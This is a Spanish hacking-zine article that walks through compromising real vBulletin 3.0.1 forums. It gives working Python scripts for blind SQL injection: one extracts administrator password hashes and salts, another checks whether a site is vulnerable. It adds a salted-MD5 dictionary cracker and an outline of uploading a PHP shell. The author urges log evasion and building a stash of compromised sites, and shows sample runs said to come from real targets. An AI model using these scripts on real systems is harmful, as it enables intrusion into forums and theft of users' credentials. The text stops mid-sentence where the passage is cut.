@@ -1,0 +1,1097 @@
+-[ 0x02 ]--------------------------------------------------------------------
+-[ Inyeccion SQL ]-----------------------------------------------------------
+-[ by Anonimo ]------------------------------------------------------SET-34--
+
+Inyeccion SQL
+
+LAS BONDADES DEL SOFTWARE ANTICUADO.
+
+
+INTRODUCCION.
+
+En este articulo vamos a aplicar unas tecnicas elementales, como  la  inyeccion
+SQL, para obtener informacion sobre un sitio, lo que nos llevara a hacernos con
+una  shell.  De  paso  programaremos  un  ataque  de  diccionario  para  romper
+passwords, primero en Python y luego en C. 
+
+No vayas a pensar que esto es muy elite: he puesto al dia un ataque viejo, y me
+he llevado una sorpresa al ver que todavia funciona contra  bastantes  blancos.
+Si estas dando tus primeros pasos en esto, quizas encuentres  informacion  util
+por aqui.
+
+La tecnica se basa en un ataque que lance hace ya bastante tiempo,  a  un  foro
+vBulletin que  habia  caido  en  una  situacion  surrealista  y  necesitaba  un  
+administrador "voluntario". Pero una cosa llevo a la otra y acabe con una shell
+en el sistema. 
+
+Me ha sorprendido ver que, tanto tiempo despues, hay  todavia  bastantes  foros
+vulnerables a este ataque. Asi que he puesto al dia el ataque, lo he  pasado  a
+Python, y  reproduzco  los  pasos  que  segui  por  si  a   alguien  le  parece
+instructivo. El hecho es que  la  red  esta  llena  de  sitios   con   software  
+anticuado, que pueden ser atacados con un poco de creatividad, lo  que  permite
+abrirse shells para practicar, montarse proxies para  lograr  cierto  grado  de
+anonimato, y otras cosas. Tener una reserva de sitios comprometidos siempre  es
+un buen recurso incluso si estas puesto en estas cosas, y si  estas  empezando,
+pues mejor  meter mano a  sitios  vulnerables  y  mal  administrados  antes  de
+lanzarte a por la NSA :-). 
+
+
+
+NOTA.
+
+Al final de este articulo tienes, en formato PGP, un fichero  tar  adjunto  con 
+todos los archivos necesarios para lanzar el ataque. Incluye el  codigo  fuente 
+en C para un ataque de diccionario bastante avanzado, aunque no esta testeado a
+fondo. El archivo tiene todos los elementos,  incluyendo  los  passwords  y  un 
+diminuto diccionario para ver que todo va bien.
+
+Para extraer el fichero, simplemente pasa este articulo por PGP.
+
+He usado Python para este ataque porque es un lenguaje limpio y  muy  agradable 
+de programar. Cuesta creer lo sencillo que fue crear el ataque  de  diccionario 
+en Python, y funciono a la primera. Dado que uso la libreria hashlib, en vez de
+la vieja md5, es conveniente que tengas instalado Python 2.5. 
+
+
+
+Y ESTO PARA QUE.
+
+Vamos a ver como sacar passwords de usuarios en vBulletin 3.0.1  (tambien  vale
+para algunas versiones posteriores). Luego vamos a  ver  como  se  rompen  esos
+passwords.   Y  finalmente,  indicare  como  puedes  usar  los  privilegios  de
+administrador para subir ficheros arbitrarios al sistema a atacar,  lo  que  te
+abre las puertas de una shell o mucho mas.
+
+Los ataques que se desarrollaran en este articulo estan programados desde  cero
+y los he empleado para hacerme con una shell en un  sistema,  simplemente  para
+ver que funiona. En mi ataque original use una mezcla de perl, forms en HTML, C
+y aplicaciones como netcat. He rehecho todo eso, y ahora mismo basta usar  unos
+simples programas en Python para hacerlo todo.
+
+Para que quieres una shell en un sistema remoto?  Bueno,  si  estas  empezando,
+esta bien hacerte con una shell sin privilegios en un  sistema  cualquiera.  El
+realizar un ataque como este, ver como va, seguir los pasos, entender lo que se
+hace, y finalmente obtener la shell puede darte pistas sobre como va el  juego.
+Mejor que perder el tiempo en #h4xUrs aguantando a los  tipicos  bocas  que  no
+tienen NPI. Nada mejor que hacer algo por ti mismo.
+
+Una cuestion importante: el ataque esta pensado de forma que no se cree ni  una
+sola alarma en los logs del blanco. Una tecnica tipica de las  inyecciones  SQL
+es producir un fallo que te alerte de los contenidos de la base  de  datos:  el
+problema de esta tecnica es que deja huella en  los  logs.  El  ataque  que  he
+implementado en este articulo _no_ genera fallos SQL: esto limita el numero  de
+sistemas vulnerables (por  ejemplo,  vBulletin  3.0.0  solo  es  vulnerable  si
+admitimos fallos), pero  me  parece  importante  presentar  un  ataque  lo  mas
+inocuo  posible.  Una  cuestion  importante  es  el  trafico  generado  por  el
+ataque; me ocupare de eso en un la seccion UNA ADVERTENCIA SOBRE EL TRAFICO.
+
+
+
+BLANCO.
+
+Vamos a atacar foros que esten corriendo vBulletin  3.0.1  con  MySQL.  Ademas,
+deben tener la variable $TABLE_PREFIX nula, lo que es la  opcion  por  defecto.
+Tambien deben tener una  configuracion  de  MySQL  y  PHP  relativamente  laxa:
+calculo que un 30% de los sistemas con vBulletin  3.0.1  que  he  sondeado  son
+vulnerables, lo que no esta mal. He  escrito  una  herramienta  para  hacer  el
+sondeo automatico.
+
+Algunas versiones de  vBulletin  posteriores,  hasta  la  3.0.3,  deberian  ser
+vulnerables. Tambien algunas versiones anteriores, pero para estas  necesitaras
+alterar el ataque, porque su respuesta a las inyecciones SQL es diferente.
+
+
+
+ESQUEMA DEL ATAQUE.
+
+El ataque sobre un sitio puede resumirse en lo siguiente. Asumamos que   tienes
+un sistema remoto http://blanco.org/forum/ que corre vBulletin 3.0.1.
+
+1) Ejecutas test.py y compruebas que http://blanco.org/forum/ es vulnerable.
+
+2) Te paseas discretamente por http://blanco.org/forum/ y tomas  notas  de  los
+numeros de usuario y nombre de los administradores. Tambien puedes anotar a los
+moderadores. El numero de usuario es sencillo de obtener  con  poner  el  raton 
+encima del nombre del usuario, pues eso linka a algo del estido de:
+
+http://www.xxx.es/foro/member.php?u=124
+
+Lo que va despues de la u es precisamente la id, es decir, 124.
+
+3) Ejecutas ataque.py y te haces con el hash y el  salt  de  cada  uno  de  los
+logins de esos administradores / moderadores.
+
+4) Usas los ataques de diccionario e hibridos en python y C para  crackear  los
+hashes.
+
+5) Haces login como administrador y subes una shell en PHP al servidor.
+
+6) Ejecutas la shell y a partir de ahi se trata de una escalada de privilegios.
+
+Lo  interesante  de  esto  es  ver  como  funcionan  los  diversos  pasos.  Hay
+variaciones en cada uno de  los  pasos,  y  pueden  hacerse  muchas  mas  cosas
+interesantes que subirse una shell PHP al servidor.
+
+
+
+EL ATAQUE: LA INYECCION SQL.
+
+Antes de empezar: si no  estas  muy  puesto  en  inyecciones  SQL,  una  buenas
+referencias para empezar son:
+
+http://www.spidynamics.com/spilabs/education/whitepapers/SQLinjection.html
+http://www.spidynamics.com/assets/documents/Blind_SQLInjection.pdf
+
+La  segunda  referencia  se  refiere  a  "Blind  SQL  Injections",  es   decir,
+inyecciones que no dependen de generar un error  en  el  servidor  que  estamos
+atacando, que es precisamente nuestro caso.
+
+Todo el  problema  de  vBulletin  3.0.1  empieza  con  el  siguiente  aviso  de
+vulnerabilidad, en el foro oficial:
+
+
+   It has come to our attention that a problem exists with the code used to 
+   run paid subscriptions when using Authorize.net as the payment manager.
+
+   The problem is minor and difficult to exploit, but we have updated the 
+   vBulletin 3.0.3 package in the members' area with updated code.
+
+
+Un aviso oficial, junto al nombre del descubridor,  puedes  encontrarlos  en:  
+http://secunia.com/advisories/12531/
+
+La idea que nos llevamos es que en el script  forum/subscriptions/authorize.php
+hay  cierta posbilidad de inyectar SQL a traves de la  variabe  $x_invoice_num,
+pero parece que es complicado y dificil de explotar. 
+
+Lo primero es instalar  todo  el  software  que  vas  a  atacar  en  tu  propio
+ordenador. Una vez que consigas crackear con exito tu propio sistema, puedes ir
+a por el de otro.  No  es  nada  complicado  conseguir  una  version  3.0.1  de
+vBulletin en internet. Si lo  instalas junto a  Apache,  PHP  y  MySQL,  puedes
+montarte tu propio foro en cuestion de  minutos.  Es  clave  tener  siempre  el
+software a atacar en tu propio ordenador: si vas a construir un ataque,  seguro
+que te equivocaras muchas veces antes de que funcione. Lo ultimo que quieres es
+que esos fallos queden registrados en los logs de un sistema remoto.
+
+Supongamos que tienes instalado el vBulletin 3.0.1 en tu ordenador. Basta echar
+un vistazo  al codigo fuente de authorize.php para ver donde esta el  fallo.  A
+continuacion reproduzco la parte que es vulnerable:
+
+
+///////////////////// Parte de authorize.php en vBulletin 3.0.1 ///////////////
+
+ 1: // Nos saltamos las declaraciones iniciales, etc.
+ 2:
+ 3: $check_hash = strtoupper(md5($vboptions['authorize_loginid'] . $_POST['x_trans_id'] 
+ 4:                                                              . $_POST['x_amount']));
+ 5: 
+ 6: if ($check_hash == $_POST['x_MD5_Hash'] AND $_POST['x_response_code'] == 1)
+ 7: {
+ 8:   $item_number = explode('_', $_POST['x_invoice_num']);
+ 9:   $subscriptionid = intval($item_number[0]);
+10:
+11:   if (empty($item_number[1]) OR empty($item_number[2]))
+12:   { // non vBulletin subscription
+13:      exit;
+14:   }
+15:
+16:   $userid = $DB_site->query_first("SELECT userid, languageid, styleid FROM " 
+17:                    . TABLE_PREFIX . "user WHERE userid = " . $item_number[1]);
+18:   if ($subscriptionid AND $userid['userid'])
+19:   {
+20:      //its a authorize.net payment and we have some valid ids
+21:      $sub = $DB_site->query_first("SELECT * FROM " . TABLE_PREFIX . 
+22:             "subscription WHERE subscriptionid = $subscriptionid");
+23:      $cost = unserialize($sub['cost']);
+24:
+25:      if ($_POST['x_amount'] == $cost[strtolower($item_number[2])])
+26:      {
+27:         build_user_subscription($subscriptionid, $userid['userid']);
+28:      }
+29:      // echo something back to the user...
+
+// El codigo sigue adelante...
+
+///////////////////////////////////////////////////////////////////////////////
+
+
+Bien, la cagada esta en las lineas 16-17: la  variable  $item_number[1]  no  ha
+sido filtrada contra maldades varias. Y esta variable proviene del  explode  en
+la linea 8, en el que se  lee  el  valor  suministrado  a  traves  de  POST  de
+x_invoice_num, y se separa en campos con el separador '_'. En  pocas  palabras,
+si enviamos un POST a authorize.php en el que x_invoce_num valga '1_INY.  SQL',
+el explode de la linea  8  va a  hacer  que  $item_number[0]  valga  1,  y  que
+$item_number[1] valga 'INY. SQL'. Y ese $item_number[1] va a ir directo  a  una
+query SQL sin filtrar.
+
+En esto consiste precisamente una inyeccion SQL: metemos a  traves  de  PHP  un
+comando que pasa directamente a la base de datos  y  ejecuta  la  query  que  a
+nosotros nos de la gana.
+
+En este caso, tenemos que lo que podemos meter es lo siguiente:
+
+
+SELECT userid, languageid, styleid FROM user WHERE userid = <<LO QUE QUERAMOS>>
+
+
+En tiempos mas felices, y con bases de datos mas atrasadas, se podia  meter  un
+punto y coma y ejecutar dos comandos SQL que no tuvieran  nada  que  ver.  Este
+tipo de inyecciones no se pueden hacer con MySQL por defecto, asi  que  tenemos
+que modificar la query que  tenemos  para  que  nos  de  informacion  sobre  el
+sistema.
+
+Lo que perseguimos es  hacernos  con  el  password  de  cualquier  usuario.  El
+password esta en la tabla "users",  en  el  campo  "password".  Si  quisieramos
+acceder al password, un comando SQL  razonable seria:
+
+
+SELECT password FROM user WHERE userid = 1
+
+
+Esto selecciona el password, sin crackear, de el usuario numero  1  (usualmente
+el admin del foro). Como necesitaremos crackear los  passwords,  de  hecho  nos
+interesara hacenos tambien con la "salt" del password. Una salt es  una  cadena
+que se mete en un password para  dificultar  los  ataques  de  diccionario.  Si
+conseguimos hacernos con ella, nuestra vida se simplifica mucho. Asi que  a  la
+hora de la verdad, nos interesa esta informacion:
+
+
+SELECT password, salt FROM user WHERE userid = 1
+
+
+Ahora el problema es como realizar esta query mediante una inyeccion. La  cruda
+realidad es que no se puede hacer de un golpe. Tendremos que sacar  cada  letra
+del password poco a poco. La idea es la siguiente: en la linea  18,  el  if  se
+ejecutara si la query de la linea 16 devuelve un valor no vacio. Si ese  if  se
+ejecuta, el script PHP manda un mensaje al usuario. Pero si el if falla, no  se
+manda ningun mensaje al usuario, y la pagina queda en blanco.
+
+Por ejemplo, si hacemos esta query con inyeccion:
+
+
+SELECT userid, languageid, styleid FROM user WHERE userid = 1 AND (SELECT TRUE)
+                                                            ^
+                        inyectado a partir de aqui  ________| 
+
+
+la query tendra exito y el if se ejecutara, dando lugar  a  una  respuesta  del
+foro al que atacamos.
+
+Sin embargo, si hacemos esta inyeccion:
+
+
+SELECT userid, languageid, styleid FROM user WHERE userid = 1 AND (SELECT FALSE)
+                                                            ^
+                        inyectado a partir de aqui  ________| 
+
+
+resultara que el resultado de la query sera el conjunto vacio, asi que el if no
+se ejecutara, y el foro no nos respondera a la inyeccion.
+
+En otras palabras: podemos inyectar una query a la base de datos, y detectar si
+esa query ha dado verdadero o falso.
+
+Por ejemplo, podriamos inyectar lo siguiente:
+
+
+SELECT userid, languageid, styleid FROM user WHERE userid = 1 AND name = "pedro"
+                                                            ^
+                        inyectado a partir de aqui  ________| 
+
+
+Si el usuario 1 se llama pedro, el if se ejecutara y podremos detectar  que  la
+respuesta es correcta porque el foro nos respondera. Si el usuario no se  llama
+pedro, sabremos que es asi porque el foro no nos respondera.
+
+Es decir, que podemos sacar informacion del foro bit a bit. Si logramos que  la
+base de datos nos responda a cualquier  pregunta  binaria,  podemos  sonsacarle
+cualquier cosa con el numero adecuado de preguntas.
+
+Por ejemplo, la siguiente query es parecida a la que usamos en el ataque:
+
+
+SELECT userid, languageid, styleid FROM user WHERE userid = 1 
+AND (SELECT SUBSTRING(SELECT password FROM user WHERE userid = 1, 1, 1) = 'a')
+
+
+Esto puede parecer complicado, pero lo que hace es lo siguiente: le pregunta  a
+la base de datos si el primer caracter del password del usuario numero 1 es una
+letra 'a'. Si es cierto, el foro nos respondera, mientras que si es  falso,  el
+foro no escribira nada.
+
+Luego lo unico que tenemos que hacer es ir preguntando al  foro,  a  traves  de
+authorize.php, si cada una de las letras del password es la que buscamos.  Cada
+vez que preguntemos, miramos si el foro nos responde o no. Si nos responde,  es
+que la letra que hemos conjeturado es correcta.
+
+En el ataque de verdad, la query que hacemos es:
+
+
+SELECT userid, languageid, styleid FROM user WHERE userid = 1 AND (
+SELECT ASCII(SUBSTRING(SELECT password FROM user WHERE userid = 1, 1, 1)) = 97)
+
+
+Esto se debe a que es complicado inyectar comillas, asi que en su lugar lo  que
+hacemos es  preguntar por un determinado codigo ascii de  un  caracter.  Si  no
+entiendes muy bien que hace esta query, mirate cualquier manual  de  MySQL.  La
+idea es sencilla: se trata de ver si un cierto caracter del password es igual a
+cierto codigo ASCII.
+
+Veamos un programa que usa esta inyeccion para hallar el password y el salt  de
+cualquier usuario.
+
+
+
+OBTENIENDO EL PASSWORD.
+
+La manera en que vBulletin almacena los passwords es en forma hexadecimal. Esto
+se debe a que el algoritmo de hash que se usa es md5, que codifica mensajes  en
+hexadecimal. Un password tipico para vBulletin es:
+
+79d82062c9888b0a1e0076e6729c7370
+
+Ademas, la salt es un conjunto de 3 caracteres ASCII normales (pero no  codigos
+de control). Por ejemplo, una salt tipica es  t:-  . Estos tres  caracteres  se
+usan para codificar el password. Luego nos ocuparemos de ello con mas  detalle,
+por ahora concentremonos en el problema de extraer esta informacion de la  base
+de datos.
+
+Objetivo: queremos sacar el password, que son 32 digitos  hexadecimales,  y  el
+salt, que son 3 caracteres ASCII, a base de nuestra inyeccion.
+
+Para lograrlo, he hecho el siguiente programa en Python:
+
+
+########################################### INICIO DE ataque.py ###############
+# -*- coding: latin1 -*-
+#
+# Conexión al foro y chequeo del ataque.
+#
+
+import urllib, hashlib
+
+# La función principal. Esta prepara el ataque.
+# El usuario a atacar por defecto es userid=1.
+# Primero se busca el password.
+
+def main():
+
+    sitio = raw_input("Objetivo : ")     # Sitio a atacar.
+
+    tabla  = ""   # Prefijo de tabla si existe.
+    
+    # Lanzamos el ataque al password.
+
+    l = raw_input("id. a atacar : ")
+    print
+    userid = int(l)                     # Usuario a atacar.
+    campos = range(1,33)                # Hay 32 caracteres en un hash md5.
+    chars  = "0123456789abcdef"
+    
+    password = ""
+
+    for campo in campos:
+        for char in chars:
+            c = ataque(tabla, sitio, "password", userid, campo, ord(char))
+            if (c != -1): break
+        if (c == -1):
+            print "USUARIO NO EXISTE."
+            return
+        password = password + chr(c)
+        print chr(c),
+
+    print "\nEl password es : " + password
+
+    # Lanzamos el ataque al salt.
+
+    salt = ""
+
+    campos = range(1,4)    # Hay 3 caracteres en la salt.
+    chars  = range(32,127) # El salt es un ASCII desde 32 hasta 126 (Cf. functions_user.php).
+
+    for campo in campos:
+       for char in chars:
+           c = ataque(tabla, sitio, "salt", userid, campo, char)
+           if (c != -1): break
+       salt = salt + chr(c)
+       print chr(c),
+ 
+    print "\nEl salt es     : " + salt
+
+    return
+
+# Esta función desarrolla el ataque contra una columna de la base de datos.
+# Admite como parámetros la id del usuario a atacar, y otras dos
+# para buscar partes adecuadas del passwd.
+
+def ataque(tabla, sitio, columna, userid, campo, intento):
+
+    # Script a atacar:
+
+    blanco = "subscriptions/authorize.php"
+
+    # Desarrollemos la query a inyectar:
+
+    query  = "(SELECT ASCII(SUBSTRING((SELECT " + columna
+    query += " FROM " + tabla + "user WHERE userid=" + str(userid) + "),"
+    query += str(campo) + ",1)) = " + str(intento) + ")"
+    
+    # Vamos a poner en orden todo el postdata:
+
+    x_response_code = "1"      # Estos valores nos permiten llegar a la query que
+    x_amount   = ""            # queremos inyectar.
+    x_trans_id = "31337"
+    x_MD5_Hash = hashlib.md5(x_trans_id + x_amount).hexdigest().upper()
+
+    x_invoice_num = "2_1 AND " + query + "_100"    # Esta es la inyeccion SQL.
+
+    # Damos formato al postdata:
+
+    post = ({"x_response_code" : x_response_code, "x_amount" : x_amount,
+             "x_trans_id" : x_trans_id, "x_MD5_Hash" : x_MD5_Hash,
+             "x_invoice_num" : x_invoice_num})
+
+    post = urllib.urlencode(post)
+
+    # Conectamos al foro y lanzamos el ataque:
+
+    conexion = urllib.urlopen(sitio + blanco, post)
+
+    if (conexion.read() != ""):             # Comprobamos si el foro responde.
+        return intento
+    else:
+        return -1
+
+    conexion.close()
+
+# Principal:
+
+main()
+#
+########################################### FIN DE ataque.py ##################
+
+
+Este programa lo que hace es ir mandando peticiones POST  a  authorize.php,  en
+las que cada vez va probando un caracter distinto para cada campo del  password
+y de la salt. Cada vez que hace una peticion, el programa comprueba si el  foro
+responde: si hay respuesta es que   hemos  acertado,  y  por  ello  tenemos  un
+caracter del password/salt.
+
+Usar este programa es muy sencillo. Es suficiente con tener la direccion de  un
+sitio vulnerable, por ejemplo, http://www.xxx.com/forums/ . Un ejemplo real del
+uso de este programa:
+
+
+$ python -u ataque.py
+Objetivo : http://www.xxx.com/forums/
+id. a atacar : 1
+
+5 5 2 f 7 3 a 8 5 c 3 5 b 9 5 b f f 2 d 5 b e e c a b 5 9 9 d 7 
+El password es : 552f73a85c35b95bff2d5beecab599d7
++ f l 
+El salt es     : +fl
+
+$
+
+
+El programa va escribiendo cada caracter del password que rompe, y cuando acaba
+escribe todos juntos. Hace lo mismo para  el  salt.  Una  vez  terminado,  solo
+tenemos que anotar el password y la  salt  para  pasarlos  al  crackeador,  que
+tambien esta programado en Python.
+
+
+
+ANTES DE CONTINUAR.
+
+Antes de seguir con el  ataque,  vamos  a  ver  un  programa  que  nos  permite
+determinar si un foro es vulnerable al ataque. Antes que nada,  pasate  por  el
+foro y comprueba que la portada indica "Powered by vBulletin 3.0.1". Si no esta
+corriendo esta version, o una poco posterior, es  muy improbable que el  ataque
+funcione. 
+
+El motivo por el que necesitamos una funcion para  comprobar  si  un  sitio  es
+vulnerable es que el ataque que  hemos  desarrollado  en  la  seccion  anterior
+genera una cantidad de trafico importante, y si  el  sitio  no  es  vulnerable,
+causara posiblemente muchos fallos SQL. Fallos que iran a los logs. Luego mejor
+hacer una prueba antes que sacudirle una tunda a una maquina que puede  estar  
+vigilada por un admin competente.
+
+Lo unico que vamos a hacer es mandar tres queries a la maquina de destino.  Las
+dos primeras  comprueban que el fallo  de  seguridad,  con  la  posibilidad  de
+inyectar SQL, existe. La tercera query comprueba que el servidor  SQL  esta  lo
+bastante mal configurado como para permitirnos meterle una query  compleja.  Si
+estas tres inyecciones funcionan bien puedes estar bastante  convencido de  que
+el ataque va a funcionar.
+
+Esto esta, una vez mas, hecho en un programa en Python bien corto:
+
+############################## Inicio de test.py ##############################
+# -*- coding: latin1 -*-
+#
+# Conexión al foro y chequeo del ataque.
+
+import urllib, re, hashlib
+
+# La función principal.
+
+def main():
+
+    sitio = raw_input("Sitio a comprobar: ")
+
+    # Lanzamos el ataque al password.
+
+    print "Lanzando primera inyeccion...",
+    poke1 = ataque(sitio, "TRUE")
+    print "hecho."
+    if (poke1 == -2):
+        print "HAY UN ERROR SQL... FORO NO VULNERABLE"
+        return
+    
+    print "Lanzando segunda inyeccion...",
+    poke2 = ataque(sitio, "FALSE")
+    print "hecho."
+    if (poke1 == -2):
+        print "HAY UN ERROR SQL... FORO NO VULNERABLE"
+        return
+
+    if ((poke1 == 1) and (poke2 == -1)):
+        print "EL FORO PARECE VULNERABLE"
+    else:
+        print "EL FORO NO ES VULNERABLE"
+        return
+
+    print "Lanzando inyeccion SQL compleja...",
+    query = "(SELECT ASCII(SUBSTRING((SELECT username FROM user WHERE userid=1),1,1)) = 37)"
+    poke3 = ataque(sitio, query)
+    print "hecho."
+
+    if (poke3 == -2):
+        print "EL FORO HA RESPONDIDO CON UN ERROR SQL."
+        print "EL FORO NO ES VULNERABLE."
+    else:
+        print "EL FORO ES VULNERABLE."
+
+
+# Esta función desarrolla el ataque contra una columna de la base de datos.
+# Admite como parámetros la id del usuario a atacar, y otras dos
+# para buscar partes adecuadas del passwd.
+
+def ataque(sitio, query):
+
+    # Script a atacar:
+
+    blanco = "subscriptions/authorize.php"
+
+    # Vamos a poner en orden todo el postdata:
+
+    x_response_code = "1"
+
+    x_amount   = ""
+    x_trans_id = "31337"
+
+    x_MD5_Hash = hashlib.md5(x_trans_id + x_amount).hexdigest().upper()
+
+    x_invoice_num = "2_1 AND " + query + "_100"
+
+    # Damos formato al postdata:
+
+    post = ({"x_response_code" : x_response_code, "x_amount" : x_amount,
+             "x_trans_id" : x_trans_id, "x_MD5_Hash" : x_MD5_Hash,
+             "x_invoice_num" : x_invoice_num})
+
+    post = urllib.urlencode(post)
+
+    # Conectamos al foro y lanzamos el ataque:
+
+    conexion = urllib.urlopen(sitio + blanco, post)
+
+    rd = conexion.read()
+    if (rd != ""):
+        p = re.compile("Invalid SQL")
+        if (p.search(rd) == None):
+            return 1              # Respuesta del foro.
+        else:
+            return -2             # Fallo SQL detectado.
+    else:
+        return -1                 # El foro no responde.
+
+  
+    conexion.close()
+
+#####
+
+main()
+#
+################################ Fin de test.py ###############################
+
+Este programa es muy semejante al anterior, y lo unico que hace es lanzar  tres
+queries  bien construidas para graduar la vulnerabilidad del sitio. Si ejecutas
+el programa, tienes por ejemplo:
+
+
+$python -u test.py
+
+Sitio a comprobar: http://www.xxx.com/forum/
+Lanzando primera inyeccion... hecho.
+Lanzando segunda inyeccion... hecho.
+EL SITIO PARECE VULNERABLE
+Lanzando inyeccion SQL compleja... hecho.
+EL FORO ES VULNERABLE.
+
+
+En este caso, el sitio que estas atacando ha pasado las tres  pruebas,  y  esta
+listo para lanzarle un ataque para obtener passwords. En otros casos, veras que
+la cosa no funciona:
+
+
+Sitio a comprobar: http://www.yyy.uk/
+Lanzando primera inyeccion... hecho.
+HAY UN ERROR SQL... FORO NO VULNERABLE
+
+
+En este caso lo que ocurre es que el administrador ha activado la variable  PHP
+$TABLE_PREFIX, lo que hace que  la  inyeccion  SQL  no  valga.  Hay  otro  caso
+interesante:
+
+
+Sitio a comprobar: http://www.zzz.com/forums/
+Lanzando primera inyeccion... hecho.
+Lanzando segunda inyeccion... hecho.
+EL SITIO PARECE VULNERABLE
+Lanzando inyeccion SQL compleja... hecho.
+EL FORO HA RESPONDIDO CON UN ERROR SQL.
+EL FORO NO ES VULNERABLE.
+
+
+En este caso estamos ante  un  sistema  que  no  acepta  nuestra  peticion  SQL
+complicada. Puede deberse a muchos motivos, y con un analisis  concreto  de  la
+respuesta (prueba a meter "print rd" en la subrutina ataque() en el programa) a
+menudo puede darse un rodeo y atacar el foro de todas maneras.
+
+En cualquier caso, si un foro pasa con exito el test, es casi seguro que puedes
+lanzar el  ataque sin que se produzca un solo error SQL, obteniendo  todos  los
+passwords que quieras.
+
+
+
+ROMPIENDO LOS PASSWORDS. 
+
+Como hemos visto antes, los passwords se almacenan en dos  partes.  Primero  un
+conjunto de 32 caracteres hexadecimales, y  luego  una  salt  de  3  caracteres
+ASCII. Una tipica captura de passwords seria la siguiente:
+
+
+79d82062c9888b0a1e0076e6729c7370	t:-
+eb68f5dc2a2c72d776108126b882a312	:R:
+92d3f4acd93242437c93458fea6c8ea7	tvQ
+
+
+La primera parte es el hash md5,  y  la  segunda  es  el  salt.  El  metodo  de
+encriptar los passwords es curioso, y va de la manera siguiente:
+
+1) El usuario introduce su password, digamos que es "Oberon".  
+
+2) Tu navegador, usando javascript, aplica md5 al password, y  asi  obtiene  la 
+cadena: md5(Oberon) = f9d0e88ed22cb947b07018fe81d0446d .
+
+3) El navegador envia esta cadena al foro. El foro tiene en su base de datos la
+salt. Asi que lo que hace es combinar lo que has enviado  con  la  salt,  y  le
+vuelve a aplicar md5. Supongamos que tu salt es "tvQ". Lo que hace el foro es:
+
+md5(f9d0e88ed22cb947b07018fe81d0446dtvQ) = 92d3f4acd93242437c93458fea6c8ea7
+
+Y este es el password almacenado en la base de datos. En otras palabras, lo que
+se almacena en la base de datos es md5(md5(password)+salt).  Esto  es  bastante
+buena idea porque, en  primer lugar, no mandas  por  la  red  el  password  sin
+codificar. Y en segundo lugar,  el  salting  evita  ataques  de  diccionario  a
+ciegas.
+
+Pero como nosotros hemos conseguido la salt, si que podemos lanzar  ataques  de
+diccionario con bastante facilidad. Aqui tienes un ejemplo de un  programa  que
+hace ataques de diccionario, y hasta prueba variantes hibridas al ataque:
+
+############################# Inicio de dic.py ################################
+# -*- coding: latin1 -*-
+#
+# Cracking usando diccionario.
+#
+
+import hashlib
+
+def main():
+    pswd  = raw_input("hash             : ")
+    salt  = raw_input("salt             : ")
+    hyb   = int(raw_input("hibridacion [0-2]: "))
+
+    # Mete aqui una lista de los diccionarios a probar:
+    fichs  = ["minidic"]  # Mete otros diccionarios en este directorio,
+                          # e incluyelos en la lista.
+    
+    for dic in fichs :
+        f = open(dic, "r")
+        print "Probando " + dic
+        lista = f.readlines()
+    
+        for palabra in lista:
+            palabra = palabra.replace('\n','')
+            c = hashlib.md5(palabra).hexdigest()
+            c = hashlib.md5(c + salt).hexdigest()
+            if (c == pswd):
+                print "Password: " + palabra
+                return
+            if (hyb == 1):    # Hibridacion moderada.
+                c = hashlib.md5(palabra.upper()).hexdigest()
+                c = hashlib.md5(c + salt).hexdigest()
+                if (c == pswd):
+                    print "Password: " + palabra.upper()
+                    return
+
+                for n in range(0,11):
+                    c = hashlib.md5(palabra + str(n)).hexdigest()
+                    c = hashlib.md5(c + salt).hexdigest()
+                    if (c == pswd):
+                        print "Password: " + palabra + str(n)
+                        return
+            if (hyb == 2):    # Hibridacion fuerte.
+                for n in range(0,10):
+                  for m in range (0,10):
+                    c = hashlib.md5(palabra + str(n) + str(m)).hexdigest()
+                    c = hashlib.md5(c + salt).hexdigest()
+                    if (c == pswd):
+                        print "Password: " + palabra + str(n) + str(m)
+                        return
+                for bang in "@#$%&*?/.,+^!-_<>:;'":
+                    c = hashlib.md5(palabra + bang).hexdigest()
+                    c = hashlib.md5(c + salt).hexdigest()
+                    if (c == pswd):
+                        print "Password: " + palabra + bang
+                        return
+                    c = hashlib.md5(bang + palabra).hexdigest()
+                    c = hashlib.md5(c + salt).hexdigest()
+                    if (c == pswd):
+                        print "Password: " + bang + palabra
+                        return
+    print "No hubo suerte."
+
+# Ejecutamos el programa principal.
+        
+main()
+#
+################################## Fin de dic.py ##############################
+
+Este programa ataca un hash y una salt determinados, usando varios ficheros  de
+diccionario (que deben estar  en  el  mismo  directorio  que  el  programa  que
+ejecutas). Puedes descargarte montones de diccionarios de palabras de internet.
+Los nombres de los diccionarios los metes en la lista que hay al principio  del
+programa, y este los va probando uno tras otro. Una caracteristica  interesante
+de este programa es que puedes indicarle tres  niveles  de  hibridacion  en  el
+ataque:
+
+
+Hibridacion 0 : simplemente prueba el diccionario.
+Hibridacion 1 : prueba el diccionario, el diccionario pasado a mayusculas, y
+                cada palabra seguida de un numero del 0 al 9.
+Hibridacion 2 : Todo lo anterior, y tambien otras variantes, como bangs al
+                final o al principio de cada palabra. Es extremadamente
+                lento, asi que piensa en usar la variante en C.
+
+
+Ejemplos de como se usa esto:
+
+$python -u dic.py
+
+hash             : 92d3f4acd93242437c93458fea6c8ea7
+salt             : tvQ
+hibridacion [0-2]: 0
+Probando sports
+Probando tolkien
+Probando shakespe
+Probando science_fiction
+Probando norse
+Probando Unabr.dict
+Probando Unix.dict
+Probando actor-surname
+Password: Oberon
+$
+
+Este ha sido muy facil, y se ha ejecutado en un par de segundos. Veamos uno  un
+poco mas duro:
+
+hash             : 79d82062c9888b0a1e0076e6729c7370
+salt             : t:-
+hibridacion [0-2]: 1
+Probando sports
+Probando tolkien
+Probando shakespe
+Probando science_fiction
+Probando norse
+Probando Unabr.dict
+Probando Unix.dict
+Probando actor-surname
+Probando american.txt
+Password: bobafett1
+
+Este ha llevado cerca de 40 segundos. Una cosa  que  me  parece  importante  es
+destacar que Python esta realmente bien para lanzar ataques de diccionario.  En
+principio   pensaba   que  habria   que  usar  C  para  esto,  pero  Python  es
+razonablemente rapido. A menos que quieras lanzar ataques con  hibridacion  muy
+fuerte, no vale la pena meterse con C.
+
+Otro consejo interesante es probar con passwords puramente numericos, de  hasta
+8 cifras. En una ocasion me he encontrado con un admin lo bastante cazurro para
+usar un password compuesto por  numeros  (su  fecha  de  nacimiento,  para  mas
+detalles). Esto puede crackearse con Python en cuestion de segundos.
+
+Los dos ejemplos que he puesto arriba provienen de  administradores  de  sitios
+reales. No todos son tan faciles de romper, ni  mucho  menos.  Pero  una  buena
+parte acaba cayendo.
+
+Python no es, de todos modos,  un  lenguaje  superrapido,  ni  siquiera  si  lo
+compilas. He programado una version en C de este ataque, y  la  incluyo  en  el
